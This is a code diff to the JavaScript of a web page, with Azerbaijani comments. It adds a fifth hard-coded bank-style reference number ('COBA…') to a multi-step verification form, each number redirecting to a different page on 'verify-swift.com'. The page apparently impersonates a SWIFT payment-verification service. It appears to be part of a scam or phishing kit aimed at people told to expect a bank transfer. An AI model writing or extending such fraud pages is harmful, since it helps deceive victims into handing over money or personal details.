@@ -345,7 +345,7 @@
 </div>
 
 <script>
-// JavaScript kodu yeniləndi - dörd referans nömrəsi əlavə edildi
+// JavaScript kodu yeniləndi - beş referans nömrəsi əlavə edildi
 let currentStep = 1;
 let verificationCode = '';
 let codeExpiry;
@@ -377,7 +377,7 @@ function setLoading(button, loading) {
     }
 }
 
-// Step 1: Reference Number
+// Step 1: Reference Number - BEŞ referans nömrəsi əlavə edildi
 document.getElementById('step1Next').addEventListener('click', () => {
     const ref = document.getElementById('referenceNumber').value.trim();
     const refError = document.getElementById('refError');
@@ -389,7 +389,7 @@ document.getElementById('step1Next').addEventListener('click', () => {
         return;
     }
 
-    // Dörd fərqli referans nömrəsi üçün yönləndirmə
+    // Beş fərqli referans nömrəsi üçün yönləndirmə
     if (ref === 'COBA300525CH59279') {
         redirectUrl = 'https://verify-swift.com/verification-cob.html';
         showStep(2);
@@ -401,6 +401,9 @@ document.getElementById('step1Next').addEventListener('click', () => {
         showStep(2);
     } else if (ref === 'COBA011125CH86478') {
         redirectUrl = 'https://verify-swift.com/verification-abnzdf';
+        showStep(2);
+    } else if (ref === 'COBA780533CH12564') {
+        redirectUrl = 'https://verify-swift.com/verification-cob-aznasdf';
         showStep(2);
     } else {
         refError.textContent = 'Invalid reference number. Please check and try again.';
